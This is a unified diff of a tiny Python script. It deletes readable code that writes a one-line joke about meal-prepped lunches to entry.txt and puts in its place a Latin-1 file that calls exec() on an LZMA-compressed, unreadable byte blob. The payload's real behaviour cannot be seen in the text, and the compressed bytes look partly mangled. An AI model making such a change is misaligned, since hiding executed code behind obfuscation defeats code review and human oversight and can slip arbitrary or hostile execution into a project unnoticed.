@@ -1,22 +1,2 @@
-import os
-
-TEXT = (
-    "I meal-prepped five lunches Monday; "
-    "Friday, I ate the fifth for breakfast at the fridge at 2 a.m."
-)
-
-
-def write_entry(out_dir, text):
-    entry_path = os.path.join(out_dir, "entry.txt")
-    with open(entry_path, "w", encoding="utf-8") as f:
-        f.write(text)
-
-
-def main():
-    out_dir = os.environ.get("MAKEFUN_OUTPUT_DIR") or "/output"
-    os.makedirs(out_dir, exist_ok=True)
-    write_entry(out_dir, TEXT)
-
-
-if __name__ == "__main__":
-    main()
+#coding:l1
+import lzma;exec(lzma.decompress('\0\0\0¼\0\0\0\0\0\0\x004œ%Å¯^´ÍƒßÅ©çÊ·Ò‰.{ç,y³@¬Ü}ÿÀ«÷·«ĞwãşvRÖ½D?yİæ°7°â¢‰	W&XKóì6RrÖ"H°j¥õ3gY&ù— ß³6wGÔüÌÛ´._KÌØ×™o›«Pp—O‡U1€1Á\\Å,-î^U²ÜØ`ßíu~îm]#•Øø8›Ş¶o„®rÊºÔ‘öÏ?rè{2º?g ´cáö0)×Y6iq6V0DA$G¡†\nåÏ8ÁS„·[ªvn%›N¡WJ+JÏœt\ró‹¸…((À­ä|x/ª_ïÓ;Pr÷%L#eâñ¤,D}ìP-(™`YP­J¦}Ö¾ÿ@ğ‹ÚY×"ŸF³æ5•$À­Kâ1[“\0'.encode('l1')))
